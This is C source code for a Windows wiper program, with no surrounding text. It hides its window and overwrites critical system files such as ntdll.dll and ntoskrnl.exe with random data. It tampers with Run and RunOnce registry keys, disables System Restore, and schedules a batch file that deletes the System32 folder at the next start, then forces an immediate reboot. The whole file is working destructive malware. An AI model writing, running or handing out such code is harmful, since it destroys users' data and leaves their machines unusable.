#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <stdio.h>  // Added this header for sprintf

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Target critical system directories
    char system32[MAX_PATH];
    char windows[MAX_PATH];
    GetSystemDirectory(system32, MAX_PATH);
    GetWindowsDirectory(windows, MAX_PATH);
    
    // List of critical system files to corrupt
    char* criticalFiles[] = {
        "\\hal.dll",
        "\\ntdll.dll",
        "\\kernel32.dll",
        "\\user32.dll",
        "\\winload.exe",
        "\\ntoskrnl.exe"
    };
    
    // Corrupt critical system files
    for(int i = 0; i < 6; i++) {
        char path[MAX_PATH];
        sprintf(path, "%s%s", system32, criticalFiles[i]);
        HANDLE hFile = CreateFile(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if(hFile != INVALID_HANDLE_VALUE) {
            // Overwrite with garbage data
            char garbage[1024];
            for(int j = 0; j < 1024; j++) garbage[j] = rand();
            DWORD written;
            WriteFile(hFile, garbage, 1024, &written, NULL);
            CloseHandle(hFile);
        }
    }
    
    // Corrupt registry entries
    HKEY hKey;
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "SystemRestore", 0, REG_SZ, (BYTE*)"corrupted", 9);
        RegCloseKey(hKey);
    }
    
    // Disable system restore
    system("powershell -Command \"Disable-ComputerRestore -Drive 'C:\\'\"");
    
    // Schedule deletion of system32 on next reboot
    char command[MAX_PATH];
    sprintf(command, "cmd /c \"rd /s /q %s\"", system32);
    char batPath[MAX_PATH];
    GetTempPath(MAX_PATH, batPath);
    strcat(batPath, "clean.bat");
    HANDLE hBat = CreateFile(batPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if(hBat != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hBat, command, strlen(command), &written, NULL);
        CloseHandle(hBat);
    }
    
    // Add to startup
    HKEY hStartup;
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hStartup) == ERROR_SUCCESS) {
        RegSetValueEx(hStartup, "SystemCleanup", 0, REG_SZ, (BYTE*)batPath, strlen(batPath));
        RegCloseKey(hStartup);
    }
    
    // Force reboot after delay
    Sleep(5000);
    system("shutdown /r /t 0 /f");
    
    return 0;
}